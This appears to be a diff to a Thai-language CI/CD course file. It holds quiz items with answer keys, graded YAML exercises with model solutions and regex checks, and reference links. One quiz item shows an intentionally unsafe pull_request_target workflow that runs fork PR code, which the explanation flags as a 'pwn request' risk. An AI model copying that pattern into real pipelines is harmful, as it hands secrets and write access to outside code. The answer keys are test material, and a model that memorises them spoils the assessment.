+        "ฝั่งที่เรียกต้องส่ง secret ให้ชัดเจนด้วย secrets: NPM_TOKEN: ... หรือ secrets: inherit",
+        "ต้องใส่ permissions: write-all ที่ job เพื่อให้ workflow ที่ถูกเรียกอ่าน secrets ได้",
+        "secrets ของ caller ถูกส่งต่อให้ทุก workflow ที่ถูกเรียกอัตโนมัติ ปัญหาน่าจะอยู่ที่ชื่อ secret"
+      ],
+      "answer": 1,
+      "explain": "ฝั่งที่เรียกต้องส่ง secrets ให้ reusable workflow ด้วย secrets: ชื่อ หรือส่งทั้งหมดด้วย secrets: inherit และส่งให้เฉพาะ workflow ที่ถูกเรียกโดยตรง permissions เป็นเรื่องของ GITHUB_TOKEN ไม่เกี่ยวกับการส่ง secret อื่น"
+    },
+    {
+      "prompt": "เพื่อให้ PR จากผู้ร่วมพัฒนาภายนอกใช้ secret ในการ test ได้ นักพัฒนาเปลี่ยน workflow เป็น pull_request_target ตามด้านล่าง (ต้องเปิด allow-unsafe-pr-checkout เพราะ checkout v7 ปฏิเสธ fork PR โดยปริยาย) ความเสี่ยงหลักคืออะไร",
+      "code": "on: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          allow-unsafe-pr-checkout: true\n      - run: npm ci && npm test",
+      "options": [
+        "pull_request_target รันบน merge commit ในสภาพแวดล้อมแยก จึงไม่มีความเสี่ยงเพิ่มจากการ checkout",
+        "ความเสี่ยงมีเฉพาะตอน npm ci รัน install script ของ dependency ส่วน npm test ปลอดภัยอยู่แล้ว",
+        "โค้ดจาก PR ภายนอกถูกรันในบริบท default branch ที่อาจมี secrets และสิทธิ์เขียน",
+        "ปัญหาเดียวคือ workflow จะรันช้าลง เพราะต้อง checkout สอง repository"
+      ],
+      "answer": 2,
+      "explain": "pull_request_target รันในบริบทของ default branch ของ repo ปลายทาง การ checkout และรันโค้ดของ PR ที่นั่นเท่ากับให้คนนอกรันโค้ดเองด้วยสิทธิ์สูง (pwn request) ใช้ pull_request สำหรับ build และ test แล้วสงวน pull_request_target ไว้กับงานที่ไม่รันโค้ด PR เช่นการติด label"
+    },
+    {
+      "prompt": "pipeline GitLab ด้านล่างมีสอง job ใน stage test เมื่อ job unit ล้มขณะที่ lint ยังรันอยู่ เกิดอะไรขึ้น",
+      "code": "stages: [build, test, deploy]\ncompile:\n  stage: build\n  script: npm run build\nunit:\n  stage: test\n  script: npm test\nlint:\n  stage: test\n  script: npm run lint\nrelease:\n  stage: deploy\n  script: ./release.sh",
+      "options": [
+        "lint ถูกยกเลิกทันที และ release ยังรันต่อได้เพราะอยู่คนละ stage",
+        "unit กับ lint รันต่อกันตามลำดับในไฟล์ จึงไม่มีโอกาสที่ lint จะรันอยู่ตอน unit ล้ม",
+        "pipeline หยุดทุก job ทันทีและทุก stage ถูกทำเครื่องหมายเป็น canceled",
+        "lint รันต่อจนจบ แต่ release ไม่เริ่ม และ pipeline เป็น failed"
+      ],
+      "answer": 3,
+      "explain": "job ใน stage เดียวกันรันขนานกัน เมื่อมี job ล้ม pipeline เป็น failed และ job ใน stage ถัดไปไม่เริ่ม ส่วน job ใน stage ปัจจุบันไม่ถูกหยุดและรันต่อจนจบ"
+    },
+    {
+      "prompt": "ใน pipeline GitLab ด้านล่าง lint ใช้เวลา 20 วินาที แต่ต้องรอ compile ราว 8 นาทีจึงเริ่มรัน เพราะ stage test เริ่มหลัง stage build ผ่าน ควรแก้อย่างไรให้ lint รู้ผลเร็วที่สุด",
+      "code": "stages: [build, test]\ncompile:\n  stage: build\n  script: npm run build\nlint:\n  stage: test\n  script: npm run lint",
+      "options": [
+        "ใส่ needs: [] ให้ lint เพื่อให้เริ่มทันทีที่สร้าง pipeline",
+        "ย้าย lint ไปไว้ใน stage .post เพื่อให้รันแยกจาก stage อื่นและไม่ถูกบล็อกโดย compile",
+        "ใส่ when: always ให้ lint เพื่อให้เริ่มโดยไม่รอผลของ compile",
+        "ใส่ needs: [compile] ให้ lint เพื่อให้ GitLab จัดคิวให้เร็วขึ้น"
+      ],
+      "answer": 0,
+      "explain": "needs: [] ทำให้ job ข้ามลำดับ stage และเริ่มได้ทันที ส่วน needs: [compile] ยังต้องรอ compile อยู่ดี stage .post รันท้ายสุดจึงช้ากว่าเดิม และ when: always กำหนดว่าจะรันแม้ job ก่อนหน้าล้มไหม แต่ไม่ได้ทำให้ข้ามการรอ stage ก่อนหน้า"
+    },
+    {
+      "prompt": "ทีมเพิ่ม rules ให้ job ด้านล่างแล้วพบว่าทุกครั้งที่ push เข้า branch ที่เปิด merge request ไว้จะเกิด pipeline สองอันซ้อนกัน (branch pipeline และ merge request pipeline) ควรแก้อย่างไร",
+      "code": "build:\n  script: npm run build\n  rules:\n    - if: $SKIP_BUILD == \"true\"\n      when: never\n    - when: always",
+      "options": [
+        "ใส่ interruptible: true ให้ job เพื่อให้ GitLab ยกเลิก pipeline ที่ซ้ำเอง",
+        "ใช้ workflow:rules กำหนดชนิด pipeline ที่อนุญาต เช่น merge request และ default branch",
+        "เปลี่ยน rule สุดท้ายเป็น when: manual เพื่อให้ผู้ใช้เลือกกด pipeline ที่ต้องการ",
+        "ย้ายบรรทัด when: always ขึ้นไปไว้ก่อน rule ที่เป็น when: never เพื่อให้ถูกประเมินก่อน"
+      ],
+      "answer": 1,
+      "explain": "rule ท้ายที่เป็น when: always ตรงกับทั้ง branch pipeline และ merge request pipeline เอกสาร GitLab แนะนำให้ใช้ workflow:rules กำหนดว่า pipeline ชนิดใดถูกสร้างได้ หรือเขียน rules ให้เจาะจงเฉพาะกรณี rules ถูกประเมินตามลำดับและหยุดที่ข้อแรกที่ตรง การสลับลำดับจึงทำให้ job รันแม้ตั้งใจให้ข้าม ส่วน manual ไม่ได้แก้เรื่อง pipeline ซ้ำ"
+    },
+    {
+      "prompt": "job build ใน GitLab เก็บ dist/ ด้วย cache (key ผูกกับ branch) เพื่อให้ job deploy ใน stage ถัดมาใช้ แต่บางรอบ deploy ไม่พบ dist/ ทั้งที่ build สำเร็จ ควรแก้อย่างไร",
+      "options": [
+        "เปลี่ยนให้ build เก็บ dist/ เป็น artifacts เพราะ cache ไม่การันตีว่าจะมีไฟล์เสมอ",
+        "ตั้ง cache:key ให้ซ้ำกันทุก branch เพื่อให้ runner ทุกเครื่องแชร์ cache เดียวกัน",
+        "เพิ่ม expire_in ให้ cache ยาวขึ้น เพราะ dist/ หายไปจากการหมดอายุ",
+        "ย้าย deploy ไปไว้ stage เดียวกับ build เพื่อให้ cache ยังอยู่ตอนรัน"
+      ],
+      "answer": 0,
+      "explain": "เอกสาร GitLab ระบุว่า cache เป็นการเพิ่มประสิทธิภาพและไม่การันตีว่าจะใช้ได้เสมอ (ขึ้นกับ executor และ runner ที่ใช้) ส่วนไฟล์ที่ต้องส่งต่อระหว่าง stage ให้ใช้ artifacts ซึ่ง GitLab เก็บไว้และ job ใน stage ถัดไปดาวน์โหลดให้ ส่วน expire_in เป็นของ artifacts ไม่ใช่ cache"
+    },
+    {
+      "prompt": "ทีมตั้ง CI/CD variable PROD_DEPLOY_KEY ไว้แบบ protected ใน GitLab นักพัฒนาทดลองรัน job deploy บน feature branch แล้วพบว่า $PROD_DEPLOY_KEY ว่าง ทั้งที่ชื่อสะกดถูก สาเหตุคืออะไร",
+      "options": [
+        "variable แบบ masked แสดงเป็นค่าว่างใน log เสมอ จึงมองไม่เห็นค่าที่ job ได้รับไปจริง",
+        "variable ชนิด protected ต้องเป็นชนิด File เท่านั้นจึงจะอ่านค่าได้ในสคริปต์ของ job",
+        "protected variable มีให้เฉพาะ pipeline บน protected branch หรือ protected tag ซึ่ง feature branch ไม่ใช่",
+        "variable ต้องได้รับอนุมัติจาก maintainer ก่อนทุกครั้งที่ job อ่านค่าไปใช้งาน"
+      ],
+      "answer": 2,
+      "explain": "ตัวเลือก protect variable ทำให้ค่านี้ใช้ได้เฉพาะ pipeline บน protected branch หรือ protected tag วิธีนี้กัน branch ทั่วไปไม่ให้เข้าถึง credential ของ production ส่วน masked เป็นเรื่องการซ่อนค่าใน log คนละเรื่องกับการเข้าถึง"
+    },
+    {
+      "prompt": "service มี replicas: 4 ทีมต้องการให้ระหว่าง rolling update มี Pod ที่พร้อมใช้งานไม่ต่ำกว่า 4 ตัวเสมอ โดยยอมใช้ทรัพยากรเพิ่มชั่วคราวได้ ควรตั้งค่า strategy อย่างไร",
+      "code": "spec:\n  replicas: 4\n  strategy:\n    type: RollingUpdate",
+      "options": [
+        "ตั้ง maxSurge: 0 และ maxUnavailable: 0 เพื่อห้ามทั้งเพิ่มและลดจำนวน Pod ระหว่างการ update",
+        "เปลี่ยน type เป็น Recreate เพราะจะสร้าง Pod ใหม่ให้ครบก่อนแล้วจึงลบของเก่าทั้งหมด",
+        "คงค่าเริ่มต้นไว้ เพราะ 25% ของ 4 ปัดลงเป็น 0 ซึ่งแปลว่าไม่มี Pod ที่ไม่พร้อมได้",
+        "ตั้ง maxUnavailable: 0 และ maxSurge: 1 เพื่อให้ Pod ใหม่พร้อมก่อนจึงลบ Pod เก่า"
+      ],
+      "answer": 3,
+      "explain": "maxUnavailable: 0 ห้ามจำนวน Pod ที่พร้อมต่ำกว่า replicas และ maxSurge: 1 อนุญาตให้สร้าง Pod ใหม่เพิ่มได้ ส่วนการตั้งสองค่าเป็น 0 พร้อมกันไม่ได้ Recreate จะฆ่า Pod เก่าทั้งหมดก่อนสร้างใหม่ และค่าเริ่มต้น maxUnavailable 25% ของ 4 คือ 1 Pod จึงยอมให้เหลือ Pod ที่พร้อมแค่ 3 ตัว"
+    },
+    {
+      "prompt": "ระหว่าง rolling update ของ API ผู้ใช้เจอ error 502 ช่วงสั้น ๆ ทุกครั้ง เพราะ Pod ใหม่ใช้เวลาราว 30 วินาทีในการโหลดข้อมูลก่อนพร้อมรับ request แต่ Service เริ่มส่ง traffic ให้ทันทีที่ container ขึ้น ควรแก้อย่างไรเป็นอันดับแรก",
+      "options": [
+        "เพิ่ม readinessProbe เพื่อให้ Pod ที่ยังไม่พร้อมไม่ได้รับ traffic จาก Service",
+        "เพิ่ม livenessProbe เพื่อให้ Kubernetes ส่ง traffic หลังจาก Pod ผ่าน liveness แล้วเท่านั้น",
+        "ใส่ sleep 30 ไว้ท้าย pipeline CI ก่อนขั้น deploy เพื่อรอให้ระบบพร้อม",
+        "เพิ่ม replicas เป็นสองเท่า เพราะ 502 เกิดจาก Pod เก่าไม่พอรับ traffic"
+      ],
+      "answer": 0,
+      "explain": "Pod ที่ readiness probe ยังไม่ผ่านจะไม่ได้รับ traffic ผ่าน Service และ rollout จะรอให้ Pod ใหม่พร้อมก่อน liveness probe มีหน้าที่ตรวจว่าต้อง restart container ไหม ไม่ได้ควบคุมว่าจะส่ง traffic ให้เมื่อไร ส่วน sleep ใน CI ไม่เกี่ยวกับสถานะของ Pod ในคลัสเตอร์"
+    },
+    {
+      "prompt": "คลัสเตอร์ production ของทีมใช้ GitOps โดยมี agent ในคลัสเตอร์ที่ตั้งให้ reconcile ดึงค่าจาก Git เมื่อเกิด incident วิศวกรรัน kubectl scale เพิ่ม replicas ด้วยมือ แต่ไม่กี่นาทีต่อมาค่ากลับไปเป็นเดิม สาเหตุที่น่าจะเป็นที่สุดคืออะไร",
+      "options": [
+        "Deployment controller ของ Kubernetes ย้อนค่ากลับเองทุกครั้งที่มีคนแก้ด้วย kubectl",
+        "agent เปรียบเทียบสถานะจริงกับค่าใน Git อย่างต่อเนื่อง และดึงค่ากลับให้ตรงกับ Git",
+        "pipeline CI ถูก trigger ใหม่โดยคำสั่ง kubectl แล้ว push ค่าเดิมกลับเข้าคลัสเตอร์",
+        "kubectl scale มีผลชั่วคราวตามค่าเริ่มต้นและหมดอายุเองหลังไม่กี่นาที"
+      ],
+      "answer": 1,
+      "explain": "หลักของ GitOps คือ agent สังเกตสถานะจริงและพยายามทำให้ตรงกับ desired state ใน Git อยู่ตลอด (reconcile) การแก้ด้วยมือจึงเป็น drift ที่ถูกดึงกลับ ถ้าต้องการให้ค่าใหม่คงอยู่ต้องแก้ใน Git ผ่าน commit หรือ PR ส่วน kubectl scale ไม่มีการหมดอายุของตัวเอง"
     }
   ],
-  "exercise": {
-    "title": "เขียน GitHub Actions สำหรับ CI",
-    "level": "กลาง",
-    "tags": "workflow · permissions · cache · ลำดับขั้น",
-    "lang": "yaml",
-    "prompt": "เขียน .github/workflows/ci.yml ที่รันเมื่อ push เข้า main และเมื่อเปิด pull request เข้า main จำกัดสิทธิ์ของ GITHUB_TOKEN ให้อ่าน repository ได้อย่างเดียว จากนั้น checkout โค้ด ตั้งค่า Node 24 พร้อม cache ของ npm แล้วรัน npm ci, npm run lint และ npm test ตามลำดับ ใช้ action เวอร์ชันหลักปัจจุบัน (actions/checkout@v7 และ actions/setup-node@v7)",
-    "context": "repository เป็นโปรเจกต์ Node.js ที่มี package-lock.json และมี script lint กับ test ใน package.json อยู่แล้ว ทีมต้องการให้ PR ทุกอันรู้ผลภายในไม่กี่นาที และไม่ให้ workflow มีสิทธิ์เขียน repository โดยไม่จำเป็น",
-    "starter": "name: CI\n\n# เขียน workflow ต่อที่นี่\n",
-    "solution": "name: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run lint\n      - run: npm test\n",
-    "hints": [
-      "workflow มีสามส่วนหลักระดับบนสุด: on (รันเมื่อไร), permissions (สิทธิ์ของ token) และ jobs (รันอะไร)",
-      "job หนึ่งต้องมี runs-on: ubuntu-latest และ steps: โดย step แรกคือ uses: actions/checkout@v7 และตั้ง permissions: contents: read",
-      "actions/setup-node@v7 รับ with: node-version: 24 และ cache: npm จากนั้นแยก run: เป็นสาม step คือ npm ci, npm run lint และ npm test"
-    ],
-    "checks": [
-      {
-        "label": "trigger เมื่อ push และ pull_request",
-        "pattern": "^['\"]?on['\"]?:[\\s\\S]*\\bpush\\b[\\s\\S]*pull_request|^['\"]?on['\"]?:[\\s\\S]*pull_request[\\s\\S]*\\bpush\\b"
-      },
-      {
-        "label": "จำกัดสิทธิ์ GITHUB_TOKEN เป็น contents: read",
-        "pattern": "permissions:\\s*read-all|permissions:[\\s\\S]*?contents:\\s*['\"]?read"
-      },
-      {
-        "label": "มี jobs และ runs-on",
-        "pattern": "jobs:[\\s\\S]*runs-on:"
-      },
-      {
-        "label": "checkout โค้ด",
-        "pattern": "uses:\\s*['\"]?actions\\/checkout@"
-      },
-      {
-        "label": "ใช้ setup-node กับ Node 24",
-        "pattern": "uses:\\s*['\"]?actions\\/setup-node@[\\s\\S]*node-version:\\s*['\"]?24"
-      },
-      {
-        "label": "cache ของ npm",
-        "pattern": "cache:\\s*['\"]?npm"
-      },
-      {
-        "label": "ลำดับ npm ci → lint → test",
-        "pattern": "npm ci[\\s\\S]*npm run lint[\\s\\S]*npm (run )?test"
-      }
-    ]
-  }
+  "exercises": [
+    {
+      "title": "เขียน GitHub Actions สำหรับ CI",
+      "level": "กลาง",
+      "tags": "workflow · permissions · cache · ลำดับขั้น",
+      "lang": "yaml",
+      "prompt": "เขียน .github/workflows/ci.yml ที่รันเมื่อ push เข้า main และเมื่อเปิด pull request เข้า main จำกัดสิทธิ์ของ GITHUB_TOKEN ให้อ่าน repository ได้อย่างเดียว จากนั้น checkout โค้ด ตั้งค่า Node 24 พร้อม cache ของ npm แล้วรัน npm ci, npm run lint และ npm test ตามลำดับ ใช้ action เวอร์ชันหลักปัจจุบัน (actions/checkout@v7 และ actions/setup-node@v7)",
+      "context": "repository เป็นโปรเจกต์ Node.js ที่มี package-lock.json และมี script lint กับ test ใน package.json อยู่แล้ว ทีมต้องการให้ PR ทุกอันรู้ผลภายในไม่กี่นาที และไม่ให้ workflow มีสิทธิ์เขียน repository โดยไม่จำเป็น",
+      "starter": "name: CI\n\n# เขียน workflow ต่อที่นี่\n",
+      "solution": "name: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run lint\n      - run: npm test\n",
+      "hints": [
+        "workflow มีสามส่วนหลักระดับบนสุด: on (รันเมื่อไร), permissions (สิทธิ์ของ token) และ jobs (รันอะไร)",
+        "job หนึ่งต้องมี runs-on: ubuntu-latest และ steps: โดย step แรกคือ uses: actions/checkout@v7 และตั้ง permissions: contents: read",
+        "actions/setup-node@v7 รับ with: node-version: 24 และ cache: npm จากนั้นแยก run: เป็นสาม step คือ npm ci, npm run lint และ npm test"
+      ],
+      "checks": [
+        {
+          "label": "trigger เมื่อ push และ pull_request",
+          "pattern": "^['\"]?on['\"]?:[\\s\\S]*\\bpush\\b[\\s\\S]*pull_request|^['\"]?on['\"]?:[\\s\\S]*pull_request[\\s\\S]*\\bpush\\b"
+        },
+        {
+          "label": "จำกัดสิทธิ์ GITHUB_TOKEN เป็น contents: read",
+          "pattern": "permissions:\\s*read-all|permissions:[\\s\\S]*?contents:\\s*['\"]?read"
+        },
+        {
+          "label": "มี jobs และ runs-on",
+          "pattern": "jobs:[\\s\\S]*runs-on:"
+        },
+        {
+          "label": "checkout โค้ด",
+          "pattern": "uses:\\s*['\"]?actions\\/checkout@"
+        },
+        {
+          "label": "ใช้ setup-node กับ Node 24",
+          "pattern": "uses:\\s*['\"]?actions\\/setup-node@[\\s\\S]*node-version:\\s*['\"]?24"
+        },
+        {
+          "label": "cache ของ npm",
+          "pattern": "cache:\\s*['\"]?npm"
+        },
+        {
+          "label": "ลำดับ npm ci → lint → test",
+          "pattern": "npm ci[\\s\\S]*npm run lint[\\s\\S]*npm (run )?test"
+        }
+      ]
+    },
+    {
+      "title": "เขียน .gitlab-ci.yml ให้ lint เริ่มทันทีและ deploy เฉพาะ default branch",
+      "level": "ง่าย",
+      "tags": "GitLab CI · stages · needs · artifacts · rules",
+      "lang": "yaml",
+      "prompt": "เขียน .gitlab-ci.yml สำหรับโปรเจกต์ Node.js โดยใช้ image node:24 และกำหนด stages เรียงเป็น test, build, deploy มี 4 job ได้แก่ lint (stage test) ที่ต้องเริ่มทันทีโดยไม่รอ job อื่นและรัน npm ci ตามด้วย npm run lint, unit-test (stage test) รัน npm ci ตามด้วย npm test, build (stage build) รัน npm ci ตามด้วย npm run build และเก็บโฟลเดอร์ dist/ เป็น artifacts ที่หมดอายุใน 1 week และ deploy (stage deploy) รัน ./deploy.sh เฉพาะ pipeline ของ default branch เท่านั้น (ใช้ rules ไม่ใช้ only/except)",
+      "context": "ทีมย้ายมาใช้ GitLab โปรเจกต์มี package-lock.json และ script lint, test, build ใน package.json อยู่แล้ว ทีมต้องการให้ lint ตอบเร็วที่สุด และห้าม deploy จาก feature branch",
+      "starter": "# .gitlab-ci.yml\nimage: node:24\n\n# กำหนด stages และ jobs ต่อที่นี่\n",
+      "solution": "image: node:24\n\nstages:\n  - test\n  - build\n  - deploy\n\nlint:\n  stage: test\n  needs: []\n  script:\n    - npm ci\n    - npm run lint\n\nunit-test:\n  stage: test\n  script:\n    - npm ci\n    - npm test\n\nbuild:\n  stage: build\n  script:\n    - npm ci\n    - npm run build\n  artifacts:\n    paths:\n      - dist/\n    expire_in: 1 week\n\ndeploy:\n  stage: deploy\n  script:\n    - ./deploy.sh\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n",
+      "hints": [
+        "โครงสร้างระดับบนคือ image, stages แล้วตามด้วยแต่ละ job และ job ที่ไม่ระบุ stage จะถูกจัดไว้ใน stage test โดยปริยาย",
+        "needs: [] ทำให้ job เริ่มทันทีโดยไม่รอ stage ก่อนหน้า ส่วน artifacts ใช้ paths กับ expire_in และการจำกัดว่า job รันเมื่อไรใช้ rules: ตามด้วย - if:",
+        "เงื่อนไขของ deploy คือ $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH และอายุของ artifacts คือ expire_in: 1 week"
+      ],
+      "checks": [
+        {
+          "label": "ใช้ image node:24",
+          "pattern": "image:[\\s\\S]{0,40}node:24"
+        },
+        {
+          "label": "stages เรียง test → build → deploy",
+          "pattern": "^stages:\\s*(\\[[^\\]]*\\btest\\b[^\\]]*\\bbuild\\b[^\\]]*\\bdeploy\\b|[\\s\\S]*?-\\s*['\"]?test['\"]?\\s*\\n[\\s\\S]*?-\\s*['\"]?build['\"]?\\s*\\n[\\s\\S]*?-\\s*['\"]?deploy\\b)"
+        },
+        {
+          "label": "lint เริ่มทันทีด้วย needs: []",
+          "pattern": "needs:\\s*\\[\\s*\\]"
+        },
+        {
+          "label": "build เก็บ dist/ เป็น artifacts",
+          "pattern": "artifacts:[\\s\\S]*?paths:[\\s\\S]*?dist"
+        },
+        {
+          "label": "artifacts หมดอายุใน 1 สัปดาห์",
+          "pattern": "expire_in:\\s*['\"]?(1\\s*(week|w)s?|7\\s*(days?|d))\\b"
+        },
+        {
+          "label": "deploy ใช้ rules เฉพาะ default branch",
+          "pattern": "rules:[\\s\\S]*?if:\\s*['\"]?\\$ci_commit_(branch|ref_name)['\"]?\\s*==\\s*['\"]?\\$ci_default_branch|rules:[\\s\\S]*?if:\\s*['\"]?\\$ci_default_branch['\"]?\\s*==\\s*['\"]?\\$ci_commit_(branch|ref_name)"
+        },
+        {
+          "label": "ไม่ใช้ only/except แบบเก่า",
+          "pattern": "^\\s*(only|except):",
+          "negate": true
+        }
+      ]
+    },
+    {
+      "title": "ทำ deploy workflow ให้ส่งค่า ส่งไฟล์ และไม่ deploy ซ้อน",
+      "level": "ยาก",
+      "tags": "needs · job outputs · artifacts · environment · concurrency",
+      "lang": "yaml",
+      "prompt": "แก้ .github/workflows/deploy.yml ด้านล่างให้ครบสี่เรื่อง (1) job build หาค่า version จาก 7 ตัวแรกของ commit SHA เขียนลง $GITHUB_OUTPUT ใน step ที่มี id แล้วประกาศเป็น output ชื่อ version ของ job (2) build อัปโหลดโฟลเดอร์ dist/ เป็น artifact ชื่อ dist ด้วย actions/upload-artifact@v7 (3) job deploy ต้องรอ build, ใช้ environment ชื่อ production, ดาวน์โหลด artifact ชื่อ dist ด้วย actions/download-artifact@v8 ลงโฟลเดอร์ dist แล้วรัน ./deploy.sh dist \"$VERSION\" โดยรับค่า VERSION จาก output ของ build ผ่าน env ของ step (4) ตั้ง concurrency group ชื่อ deploy-production เพื่อไม่ให้ deploy สองรอบซ้อนกัน และห้ามยกเลิกรอบที่กำลัง deploy อยู่",
+      "context": "ตอนนี้ build กับ deploy รันขนานกัน ./deploy.sh หาโฟลเดอร์ dist ไม่เจอเพราะอยู่คนละ runner และถ้ามีสอง push ติดกัน deploy production สองรอบอาจรันซ้อนกัน ให้ชื่อ job คงเดิม คือ build และ deploy",
+      "starter": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: ./deploy.sh dist\n",
+      "solution": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: deploy-production\n  cancel-in-progress: false\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run build\n      - id: ver\n        run: echo \"version=${GITHUB_SHA::7}\" >> \"$GITHUB_OUTPUT\"\n      - uses: actions/upload-artifact@v7\n        with:\n          name: dist\n          path: dist/\n\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/download-artifact@v8\n        with:\n          name: dist\n          path: dist\n      - env:\n          VERSION: ${{ needs.build.outputs.version }}\n        run: ./deploy.sh dist \"$VERSION\"\n",
+      "hints": [
+        "แบ่งเป็นสามเรื่อง: ส่งค่าข้อความระหว่าง job (outputs กับ needs), ส่งไฟล์ระหว่าง job (artifact) และกัน deploy ซ้อน (environment กับ concurrency)",
+        "step ที่เขียน name=value ลง \"$GITHUB_OUTPUT\" ต้องมี id จากนั้น job ประกาศ outputs: version: ${{ steps.<id>.outputs.version }} และ job ถัดไปอ่านด้วย needs.build.outputs.version (ใส่ผ่าน env ของ step)",
+        "upload-artifact กับ download-artifact ต้องใช้ name: dist ตรงกัน, job deploy ใส่ needs: build และ environment: production ส่วน concurrency ตั้ง group: deploy-production พร้อม cancel-in-progress: false"
+      ],
+      "checks": [
+        {
+          "label": "deploy รอ build และอ่าน output version",
+          "pattern": "needs:\\s*(\\[\\s*|-\\s*)?['\"]?build['\"]?[\\s\\S]*needs\\.build\\.outputs\\.version"
+        },
+        {
+          "label": "build ประกาศ output version จาก step",
+          "pattern": "outputs:[\\s\\S]{0,80}?version:\\s*['\"]?\\$\\{\\{\\s*steps\\.[\\w-]+\\.outputs\\.version"
+        },
+        {
+          "label": "เขียน version ลง GITHUB_OUTPUT",
+          "pattern": "version=[^\\n]*>>\\s*['\"]?\\$\\{?github_output"
+        },
+        {
+          "label": "upload และ download artifact ชื่อ dist",
+          "pattern": "^(?=[\\s\\S]*uses:\\s*['\"]?actions/upload-artifact@)(?=[\\s\\S]*uses:\\s*['\"]?actions/download-artifact@)(?=[\\s\\S]*name:\\s*['\"]?dist['\"]?[ \\t]*\\n[\\s\\S]*name:\\s*['\"]?dist['\"]?[ \\t]*(\\n|$))"
+        },
+        {
+          "label": "deploy ใช้ environment production",
+          "pattern": "environment:\\s*['\"]?production['\"]?|environment:\\s*\\n\\s+name:\\s*['\"]?production"
+        },
+        {
+          "label": "concurrency group deploy-production",
+          "pattern": "concurrency:[\\s\\S]*?group:\\s*['\"]?deploy-production['\"]?"
+        },
+        {
+          "label": "ไม่ยกเลิกรอบที่กำลัง deploy",
+          "pattern": "cancel-in-progress:\\s*['\"]?true",
+          "negate": true
+        }
+      ]
+    }
+  ],
+  "refs": [
+    {
+      "title": "GitHub Actions: Workflow syntax",
+      "url": "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax",
+      "note": "matrix, needs, outputs, concurrency, permissions และเงื่อนไขของ paths filter"
+    },
+    {
+      "title": "GitHub Actions: Secure use reference",
+      "url": "https://docs.github.com/en/actions/reference/security/secure-use",
+      "note": "script injection, third-party actions, untrusted code checkout"
+    },
+    {
+      "title": "GitHub Actions: Events that trigger workflows",
+      "url": "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows",
+      "note": "pull_request, pull_request_target, workflow_run และ workflow จาก fork"
+    },
+    {
+      "title": "GitLab CI/CD YAML syntax reference",
+      "url": "https://docs.gitlab.com/ci/yaml/",
+      "note": "stages, needs, rules, artifacts, cache, workflow:rules"
+    },
+    {
+      "title": "Kubernetes: Deployments",
+      "url": "https://kubernetes.io/docs/concepts/workloads/controllers/deployment/",
+      "note": "RollingUpdate, rollout undo, revisionHistoryLimit"
+    },
+    {
+      "title": "OpenGitOps: GitOps Principles",
+      "url": "https://opengitops.dev/",
+      "note": "หลักการ GitOps v1.0.0 ทั้งสี่ข้อ"
+    },
+    {
+      "title": "DORA: DORA's software delivery performance metrics",
+      "url": "https://dora.dev/guides/dora-metrics/",
+      "note": "ตัวชี้วัดการส่งมอบซอฟต์แวร์ของ DORA"
+    },
+    {
+      "title": "Kubernetes: Liveness, readiness and startup probes",
+      "url": "https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/",
+      "note": "readiness probe กับการรับ traffic ผ่าน Service"
+    }
+  ]
 }
